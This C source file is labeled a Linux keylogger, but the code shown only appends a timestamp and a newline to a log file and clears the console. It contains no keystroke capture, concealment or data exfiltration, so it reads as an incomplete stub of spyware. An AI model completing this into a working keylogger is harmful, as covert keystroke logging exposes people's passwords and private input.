// Keylogger for Linux machine

#include <time.h>
#include <stdlib.h>
#include "linux_keylog.h"
#include "../writing/file.h"

// Whenever the keylogger is started, add this to the file first
void linWriteHeader(const char* filePath) {
    FILE *file;
    file = fopen(filePath, "a");
    if (file == NULL) {
        return;
    }

    // Write the date and time into the file
    time_t t = time(NULL);
    struct tm st = *localtime(&t);
    char date[100];
    sprintf(date, "[%02d/%02d/%02d %02d:%02d:%02d] : ", st.tm_mday, st.tm_mon+1, st.tm_year+1900, st.tm_hour, st.tm_min, st.tm_sec);
    fputs(date, file);
    fflush(file);
    fclose(file);
}

// Keylogger for Linux
void lin_keylog(const char* filePath) {

    // Write the header into the file
    linWriteHeader(filePath);

    // Check if the keylogger should end
    end_keylog(filePath);
}

// End the keylogger
void end_keylog(const char *filePath) {
    // Add a new line to the file
    FILE *file;
    file = fopen(filePath, "a");
    if (file == NULL) {
        return;
    }
    fputs("\n", file);
    fflush(file);
    fclose(file);

    system("clear"); // Clear the console
}